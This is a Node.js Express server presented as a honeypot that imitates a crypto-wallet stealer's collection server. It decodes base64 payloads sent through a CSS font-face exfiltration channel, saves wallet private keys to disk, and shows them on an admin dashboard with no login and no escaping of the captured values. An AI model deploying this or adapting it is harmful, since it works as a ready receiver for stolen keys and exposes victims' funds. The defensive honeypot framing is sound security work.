const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FOLDER = path.join(__dirname, 'stolen_data');
const LOGS_FOLDER = path.join(__dirname, 'logs');

if (!fs.existsSync(DATA_FOLDER)) fs.mkdirSync(DATA_FOLDER, { recursive: true });
if (!fs.existsSync(LOGS_FOLDER)) fs.mkdirSync(LOGS_FOLDER, { recursive: true });

app.set('trust proxy', true);

// Get real client IP (handles Railway's proxy)
function getClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    const realIp = req.headers['x-real-ip'];
    if (forwarded) {
        return forwarded.split(',')[0].trim();
    }
    return realIp || req.ip || req.socket.remoteAddress;
}

// Log access with IP
function logAccess(req, type, extra = {}) {
    const logEntry = {
        timestamp: new Date().toISOString(),
        type: type,
        ip: getClientIp(req),
        userAgent: req.headers['user-agent'] || 'none',
        url: req.originalUrl,
        referrer: req.headers.referer || 'none',
        ...extra
    };
    
    const logLine = JSON.stringify(logEntry) + '\n';
    fs.appendFileSync(path.join(LOGS_FOLDER, 'access.log'), logLine);
    console.log(`[${type}] ${logEntry.ip} - ${logEntry.url.substring(0, 100)}`);
}

// Main data collection endpoint - handles the CSS font-face request
app.get('*', (req, res) => {
    // Skip admin paths and static files
    if (req.path.startsWith('/admin') || req.path === '/loader.js' || req.path === '/health') {
        return res.status(404).end();
    }
    
    const timestamp = new Date().toISOString();
    const clientIp = getClientIp(req);
    
    // Extract base64 from URL path (everything after first /)
    const encodedData = req.path.substring(1); // Remove leading /
    
    console.log(`[DATA] From: ${clientIp} | Length: ${encodedData.length} | Preview: ${encodedData.substring(0, 50)}...`);
    
    if (encodedData.length < 20) {
        logAccess(req, 'SHORT_REQUEST', { length: encodedData.length });
        return sendGif(res);
    }
    
    try {
        // URL decode first (in case of double encoding)
        let decodedData = decodeURIComponent(encodedData);
        
        // Fix base64 padding
        const padding = 4 - (decodedData.length % 4);
        if (padding !== 4) {
            decodedData += '='.repeat(padding);
        }
        
        // Decode base64
        const jsonStr = Buffer.from(decodedData, 'base64').toString('utf8');
        
        // Parse JSON
        const data = JSON.parse(jsonStr);
        
        // Extract wallet keys
        const wallets = [];
        if (data.keys && Array.isArray(data.keys)) {
            wallets.push(...data.keys);
        }
        
        // Create record
        const record = {
            receivedAt: timestamp,
            attackerIp: clientIp,
            userAgent: data.header || req.headers['user-agent'],
            code: data.code,
            site: data.site,
            walletCount: data.walletCount || wallets.length,
            solanaCount: data.solanaCount || 0,
            evmCount: data.evmCount || 0,
            wallets: wallets,
            rawPayload: data
        };
        
        // Save to file
        const filename = `wallets_${timestamp.replace(/[:.]/g, '-')}_${clientIp.replace(/[^0-9a-zA-Z]/g, '_')}.json`;
        fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(record, null, 2));
        
        console.log(`✅ SAVED: ${filename} | Wallets: ${wallets.length} | IP: ${clientIp}`);
        logAccess(req, 'WALLETS_RECEIVED', { 
            filename, 
            walletCount: wallets.length,
            code: data.code 
        });
        
    } catch (err) {
        console.error(`❌ Error processing data: ${err.message}`);
        console.error(`Raw data: ${encodedData.substring(0, 200)}`);
        logAccess(req, 'PROCESS_ERROR', { error: err.message, data: encodedData.substring(0, 100) });
    }
    
    // Always return 1x1 GIF (expected by CSS font-face)
    sendGif(res);
});

function sendGif(res) {
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.setHeader('Cache-Control', 'no-store');
    res.send(gif);
}

// Health check (mimic attacker's server)
app.get('/health', (req, res) => {
    logAccess(req, 'HEALTH_CHECK');
    res.json({ success: true, msg: "OK" });
});

// Serve modified loader.js
app.get('/loader.js', (req, res) => {
    logAccess(req, 'LOADER_REQUEST');
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.sendFile(path.join(__dirname, 'loader.js'));
});

// HTML Dashboard
app.get('/admin', (req, res) => {
    logAccess(req, 'ADMIN_DASHBOARD');
    
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Honeypot - Captured Wallets</title>
        <style>
            body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; margin: 0; }
            h1 { color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
            .stats { display: flex; gap: 20px; margin: 20px 0; }
            .stat-box { border: 1px solid #0f0; padding: 15px; min-width: 150px; }
            .stat-box h3 { margin: 0 0 10px 0; color: #ff0; }
            .stat-box .number { font-size: 2em; color: #0f0; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { border: 1px solid #0f0; padding: 10px; text-align: left; }
            th { background: #003300; }
            tr:hover { background: #001100; }
            .ip { color: #ff0; font-weight: bold; }
            .wallet { color: #0ff; font-family: monospace; font-size: 0.9em; }
            .timestamp { color: #888; }
            .priv-key { color: #f00; background: #330000; padding: 2px 5px; }
            pre { background: #111; padding: 10px; overflow-x: auto; border: 1px solid #333; }
            a { color: #0f0; }
            .error { color: #f00; }
        </style>
    </head>
    <body>
        <h1>🍯 Honeypot Dashboard</h1>
        <div class="stats" id="stats">
            <div class="stat-box">
                <h3>Total Wallets</h3>
                <div class="number" id="totalWallets">-</div>
            </div>
            <div class="stat-box">
                <h3>Unique IPs</h3>
                <div class="number" id="uniqueIps">-</div>
            </div>
            <div class="stat-box">
                <h3>Solana Wallets</h3>
                <div class="number" id="solanaCount">-</div>
            </div>
            <div class="stat-box">
                <h3>EVM Wallets</h3>
                <div class="number" id="evmCount">-</div>
            </div>
        </div>
        
        <h2>Recent Captures</h2>
        <table id="capturesTable">
            <thead>
                <tr>
                    <th>Time</th>
                    <th>Attacker IP</th>
                    <th>Code</th>
                    <th>Wallets</th>
                    <th>Details</th>
                </tr>
            </thead>
            <tbody id="capturesBody">
                <tr><td colspan="5">Loading...</td></tr>
            </tbody>
        </table>
        
        <h2>Access Logs</h2>
        <pre id="accessLogs">Loading...</pre>
        
        <script>
            async function loadData() {
                try {
                    const res = await fetch('/admin/logs');
                    const data = await res.json();
                    
                    // Update stats
                    document.getElementById('totalWallets').textContent = data.totalWallets || 0;
                    document.getElementById('uniqueIps').textContent = data.uniqueIps || 0;
                    document.getElementById('solanaCount').textContent = data.solanaCount || 0;
                    document.getElementById('evmCount').textContent = data.evmCount || 0;
                    
                    // Update captures table
                    const tbody = document.getElementById('capturesBody');
                    if (data.captures.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:#888;">No captures yet</td></tr>';
                    } else {
                        tbody.innerHTML = data.captures.map(c => 
                            '<tr>' +
                            '<td class="timestamp">' + new Date(c.receivedAt).toLocaleString() + '</td>' +
                            '<td class="ip">' + c.attackerIp + '</td>' +
                            '<td>' + (c.code || 'N/A') + '</td>' +
                            '<td>' + c.walletCount + ' (' + c.solanaCount + ' SOL, ' + c.evmCount + ' EVM)</td>' +
                            '<td><a href="/admin/file?f=' + c.filename + '">View</a></td>' +
                            '</tr>'
                        ).join('');
                    }
                    
                    // Update access logs
                    document.getElementById('accessLogs').textContent = 
                        data.accessLogs.slice(-50).map(l => 
                            '[' + l.timestamp + '] ' + l.type + ' from ' + l.ip
                        ).join('\\n') || 'No logs yet';
                        
                } catch (e) {
                    document.getElementById('capturesBody').innerHTML = 
                        '<tr><td colspan="5" class="error">Error: ' + e.message + '</td></tr>';
                }
            }
            
            loadData();
            setInterval(loadData, 10000); // Refresh every 10 seconds
        </script>
    </body>
    </html>`;
    
    res.send(html);
});

// API endpoint for dashboard data
app.get('/admin/logs', (req, res) => {
    try {
        // Read access logs
        const logFile = path.join(LOGS_FOLDER, 'access.log');
        let accessLogs = [];
        if (fs.existsSync(logFile)) {
            accessLogs = fs.readFileSync(logFile, 'utf8')
                .split('\n')
                .filter(Boolean)
                .map(line => {
                    try { return JSON.parse(line); } 
                    catch (e) { return { raw: line }; }
                });
        }
        
        // Read wallet captures
        const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
        const captures = files
            .map(f => {
                try {
                    return JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
                } catch (e) {
                    return { filename: f, error: true };
                }
            })
            .sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt));
        
        // Calculate stats
        const allWallets = captures.flatMap(c => c.wallets || []);
        const uniqueIps = [...new Set(captures.map(c => c.attackerIp).filter(Boolean))];
        const solanaWallets = allWallets.filter(w => w.type === 'solana').length;
        const evmWallets = allWallets.filter(w => w.type === 'evm').length;
        
        res.json({
            captures: captures.slice(0, 50), // Last 50
            accessLogs: accessLogs.slice(-100),
            totalWallets: allWallets.length,
            uniqueIps: uniqueIps.length,
            solanaCount: solanaWallets,
            evmCount: evmWallets
        });
        
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// View specific capture file
app.get('/admin/file', (req, res) => {
    try {
        const filename = req.query.f;
        if (!filename || filename.includes('..')) {
            return res.status(400).json({ error: 'Invalid filename' });
        }
        
        const filePath = path.join(DATA_FOLDER, filename);
        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ error: 'Not found' });
        }
        
        const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
        
        // Pretty HTML view
        const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Capture Details</title>
            <style>
                body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
                .section { border: 1px solid #0f0; padding: 15px; margin: 15px 0; }
                .label { color: #ff0; }
                .ip { color: #ff0; font-weight: bold; font-size: 1.2em; }
                .priv { color: #f00; background: #330000; padding: 3px 6px; word-break: break-all; }
                .pub { color: #0ff; word-break: break-all; }
                pre { background: #111; padding: 10px; overflow-x: auto; }
                a { color: #0f0; }
            </style>
        </head>
        <body>
            <h1>📋 Capture Details</h1>
            <a href="/admin">← Back to Dashboard</a>
            
            <div class="section">
                <h2>Attacker Information</h2>
                <p><span class="label">IP Address:</span> <span class="ip">${data.attackerIp || 'Unknown'}</span></p>
                <p><span class="label">Time:</span> ${data.receivedAt}</p>
                <p><span class="label">User Agent:</span> ${data.userAgent || 'Unknown'}</p>
                <p><span class="label">Code:</span> ${data.code || 'N/A'}</p>
            </div>
            
            <div class="section">
                <h2>Captured Wallets (${data.wallets?.length || 0})</h2>
                ${(data.wallets || []).map((w, i) => `
                    <div style="margin: 15px 0; padding: 10px; border: 1px solid #333;">
                        <p><span class="label">#${i+1} Type:</span> ${w.type || 'unknown'}</p>
                        <p><span class="label">Public Key:</span> <span class="pub">${w.pub || 'N/A'}</span></p>
                        <p><span class="label">Private Key:</span> <span class="priv">${w.priv || 'N/A'}</span></p>
                    </div>
                `).join('') || '<p>No wallets captured</p>'}
            </div>
            
            <div class="section">
                <h2>Raw Data</h2>
                <pre>${JSON.stringify(data, null, 2)}</pre>
            </div>
        </body>
        </html>`;
        
        res.send(html);
        
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.listen(PORT, () => {
    console.log(`🍯 Honeypot running on port ${PORT}`);
    console.log(`Dashboard: http://localhost:${PORT}/admin`);
});